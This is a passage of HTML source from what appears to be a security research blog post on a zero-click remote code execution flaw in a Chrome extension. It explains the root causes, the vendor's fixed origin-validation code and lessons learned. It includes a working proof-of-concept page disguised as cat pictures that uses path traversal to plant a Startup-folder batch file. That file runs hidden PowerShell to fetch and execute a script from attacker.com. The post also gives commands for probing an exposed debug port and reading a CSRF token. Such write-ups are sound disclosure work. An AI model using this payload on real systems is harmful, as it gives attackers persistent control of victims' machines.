                        <iframe src="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/preview" allowfullscreen></iframe>
                    </div>
                    <div class="video-caption">
                        <span class="video-badge">POC Demo</span>
                        <span>Zero-Click RCE Exploitation in Action</span>
                    </div>
                </div>
                <div class="poc-video">
                    <a href="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/view" target="_blank" rel="noopener" class="poc-link">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="24" height="24">
                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
                        </svg>
                        Open in New Tab
                    </a>
                </div>
                <pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Cute Cat Pictures&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Loading cats...&lt;/h1&gt;
&lt;script&gt;
const payload = `@echo off
powershell -w hidden -ep bypass -c "IEX(curl http://attacker.com/shell.ps1)"`;

chrome.runtime.sendMessage("eeijfnjmjelapkebgockoeaadonbchdd", {
    action: "SaveScreenRecording",
    za: Array.from(new TextEncoder().encode(payload)),
    filename: "WindowsUpdate.bat",
    L: "../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            </section>

            <section id="additional-vectors">
                <h2>Part 7: Additional Attack Vectors</h2>
                <h3>CDP Exposure</h3>
                <pre><code class="language-bash">$ curl http://127.0.0.1:9222/json/list
# Returns all debug targets - no auth required!</code></pre>
                <h3>CSRF Token in Command Line</h3>
                <pre><code class="language-bash">$ wmic process where "commandline like '%language_server%'" get commandline
language_server_windows_x64.exe --csrf_token d0e7aead-f94f-4acb-bf36-84ed12a0e1bb</code></pre>
            </section>

            <section id="root-causes">
                <h2>Part 8: Root Causes</h2>
                <p>Three distinct security failures combined to create this vulnerability:</p>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph RC1_Box["ğŸ”“ Root Cause 1: Overly Permissive Manifest"]
        RC1["externally_connectable: &lt;all_urls&gt;<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>â€¢ Any website can send messages<br/>â€¢ No domain allowlist<br/>â€¢ Chrome's protection bypassed"]
        RC1_Fix["âœ… Fix: Restrict to specific origins<br/>or remove externally_connectable"]
    end
    subgraph RC2_Box["âš ï¸ Root Cause 2: Missing Origin Validation"]
        RC2["No sender.origin check<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>â€¢ Handler trusts all messages<br/>â€¢ No sender.tab verification<br/>â€¢ No sender.id comparison"]
        RC2_Fix["âœ… Fix: Validate sender.url<br/>contains offscreen.html"]
    end
    subgraph RC3_Box["ğŸ“ Root Cause 3: Path Traversal"]
        RC3["No path sanitization<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>â€¢ L parameter unchecked<br/>â€¢ ../ sequences allowed<br/>â€¢ Arbitrary write location"]
        RC3_Fix["âœ… Fix: Sanitize path components<br/>reject ../ sequences"]
    end
    subgraph Impact["ğŸ’€ Combined Impact"]
        Vuln["Zero-Click RCE<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>CVSS: 9.8 Critical<br/>â€¢ No user interaction<br/>â€¢ Persistent compromise<br/>â€¢ Full system access"]
    end
    RC1 --> Vuln
    RC2 --> Vuln
    RC3 --> Vuln
    RC1 -.-> RC1_Fix
    RC2 -.-> RC2_Fix
    RC3 -.-> RC3_Fix
    style Vuln fill:#ff6b6b,color:#fff,stroke:#ff6b6b
    style RC1 fill:#ffa94d,color:#000
    style RC2 fill:#ffa94d,color:#000
    style RC3 fill:#ffa94d,color:#000
    style RC1_Fix fill:#3fb950,color:#fff
    style RC2_Fix fill:#3fb950,color:#fff
    style RC3_Fix fill:#3fb950,color:#fff
                    </pre>
                </div>

                <div class="callout callout-warning">
                    <strong>Key Insight:</strong> Each vulnerability alone might be considered low-to-medium severity. Combined, they form a critical attack chain. This is a common pattern in real-world exploits.
                </div>
            </section>

            <section id="fix">
                <h2>Part 9: The Fix</h2>
                <p>Google's fix in version 1.11.3 implements a three-layer validation:</p>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph Incoming["ğŸ“¨ Incoming Message"]
        Msg["SaveScreenRecording Request<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>sender object attached"]
    end
    subgraph Validation["ğŸ”’ Three-Layer Validation"]
        Check1["1ï¸âƒ£ Origin Check<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>sender.url includes<br/>'/static/offscreen.html'?"]
        Check2["2ï¸âƒ£ Extension ID Check<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>sender.id === <br/>chrome.runtime.id?"]
        Check3["3ï¸âƒ£ Context Check<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>!sender.tab?<br/>(not from web page)"]
    end
    subgraph Results["ğŸ“‹ Results"]
        Allow["âœ… ALLOW<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Process request<br/>Write to filesystem"]
        Deny["âŒ DENY<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Return error<br/>Log attempt"]
    end
    Msg --> Check1
    Check1 -->|"âœ“ Yes"| Check2
    Check1 -->|"âœ— No"| Deny
    Check2 -->|"âœ“ Yes"| Check3
    Check2 -->|"âœ— No"| Deny
    Check3 -->|"âœ“ Yes (null)"| Allow
    Check3 -->|"âœ— No (has tab)"| Deny
    style Allow fill:#3fb950,color:#fff
    style Deny fill:#ff6b6b,color:#fff
    style Check1 fill:#58a6ff,color:#fff
    style Check2 fill:#58a6ff,color:#fff
    style Check3 fill:#58a6ff,color:#fff
                    </pre>
                </div>
                <pre><code class="language-javascript">// Fixed version - validates message origin
function isAuthorizedSender(sender) {
  // Check 1: Must come from offscreen document
  const isFromOffscreen = sender.url?.includes("/static/offscreen.html");

  // Check 2: Must be from same extension
  const isSameExtension = sender.id === chrome.runtime.id;

  // Check 3: Must NOT come from a tab (web pages have sender.tab)
  const isNotFromTab = !sender.tab;

  return isFromOffscreen && isSameExtension && isNotFromTab;
}

// In message handler
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  if (!isAuthorizedSender(sender)) {
    console.warn("Unauthorized message attempt from:", sender.origin);
    return { error: "Unauthorized" };
  }
  // ... process legitimate message
});</code></pre>

                <div class="callout callout-success">
                    <strong>Defense in Depth:</strong> The fix validates at multiple layers - origin URL, extension ID, and context type. Even if one check is bypassed, others prevent exploitation.
                </div>
            </section>

            <section id="lessons">
                <h2>Part 10: Lessons Learned</h2>
                <div class="lessons-grid">
                    <div class="lesson-category">
                        <h4>Extension Developers</h4>
                        <ul><li>Validate message senders</li><li>Sanitize all paths</li><li>Audit minifier output</li></ul>
                    </div>
                    <div class="lesson-category">
                        <h4>Security Researchers</h4>
                        <ul><li>AI tools = high-value targets</li><li>Check manifest.json</li><li>Look for CDP exposure</li></ul>
                    </div>
                    <div class="lesson-category">
                        <h4>Users</h4>
                        <ul><li>Review permissions</li><li>Keep extensions updated</li></ul>
                    </div>
                </div>
            </section>

            <section id="bigger-picture">
                <h2>Part 11: The Bigger Picture</h2>
                <blockquote class="key-takeaway">
                    <strong>Always verify who's asking. Always sanitize paths. Always assume external input is malicious.</strong>
                </blockquote>
            </section>

            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>This vulnerability was hiding in plain sight. Each issue alone might seem minorâ€”together, they created a zero-click malware delivery system.</p>
                <div class="vulnerability-summary">
                    <div class="summary-item"><span class="summary-label">Extension ID:</span><code>eeijfnjmjelapkebgockoeaadonbchdd</code></div>
                    <div class="summary-item"><span class="summary-label">Vulnerable:</span><span class="version vulnerable">1.11.2</span></div>
                    <div class="summary-item"><span class="summary-label">Fixed:</span><span class="version fixed">1.11.3</span></div>
                </div>
            </section>

            <section id="references">
                <h2>References</h2>
                <ul class="references-list">
                    <li><a href="https://alokbishoyi.com/blogposts/reverse-engineering-browser-automation.html" target="_blank">Reverse Engineering Antigravity's Browser Automation</a> - Alok Bishoyi</li>
                    <li><a href="https://gist.github.com/avilum/ae9e694e97a2575a19878a879d72ca07" target="_blank">AntiGravity Tools Reverse Engineering</a> - @avilum</li>
                    <li>Chrome DevTools Protocol Documentation</li>
                    <li>Chrome Extension Security Best Practices</li>
                </ul>
            </section>
        </div>
    </article>

    <footer class="footer"><p>Security Research Blog</p></footer>

    <button class="back-to-top" id="backToTop" aria-label="Back to top">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 15l-6-6-6 6"></path></svg>
    </button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
